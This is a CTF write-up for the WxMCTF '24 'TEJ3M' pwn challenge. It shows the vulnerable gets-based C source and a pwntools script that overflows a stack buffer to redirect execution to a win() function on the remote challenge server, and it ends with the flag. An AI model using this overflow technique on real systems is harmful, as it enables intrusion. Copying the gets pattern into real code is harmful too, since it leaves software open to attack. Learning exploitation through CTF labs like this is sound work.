https://ctftime.org/event/2179/

# WxMCTF '24 Pwn 2 - TEJ3M - PWN

Here's my TEJ3M assignment! We're learning how to use C, and I think it's pretty easy! My teacher tells us gets is unsafe, but I think he doesn't know how to error trap!

## Solution

```
$ file assgn1_2o3BvZ6 
assgn1_2o3BvZ6: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=60098334b0e5ba23faa42e6e2b56503534b62ad7, for GNU/Linux 3.2.0, not stripped
```

`acb525f6dd105f90f9b7ad7eb02b50d08ae06eb65a0ee437cbd5721bdb9e5cf3  assgn1_2o3BvZ6`

`127c779aca8b937603ba6c2985b53ad1a6b4773322f8ddb0948d2e119f2d3c4b  assgn1_ScZuUx0.c`

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void win(){
    system("cat flag.txt");
}

void func(){
    char buf[040];
    while(1) {
        puts("Enter your info: \n");
        gets(buf);
        if(strlen(buf) < 31) {
            puts("Thank you for valid data!!!\n");
            break;
        }
        puts("My teacher says that's unsafe!\n");
    }
}

void main() {
    setvbuf(stdin, NULL, 2, 0);
    setvbuf(stdout, NULL, 2, 0);
    func();
}
```

`func/0x08049245`
- reads with `gets` into a buffer on the stack with no canary
- in order to escape the while loop we must ensure that the `strlen` of our payload is less than 0x1f bytes
	+ this is easily doable with `b"0" * 0x2c`

`win/0x08049216`
- cats the flag with `system`

```
from pwn import *

REMOTE_IP = "8c7e7da.678470.xyz"
REMOTE_PORT = 30310

elf = ELF("./assgn1_2o3BvZ6")

p = remote(REMOTE_IP, REMOTE_PORT)

p.readuntil(b"Enter your info: \n\n")

payload = b"0" * 0x2c
payload += p32(elf.sym["win"])

p.sendline(payload)

p.sendline()

p.interactive()
```

## Flag
`wxmctf{m00dl3_m45t3rm1nd!!!}`
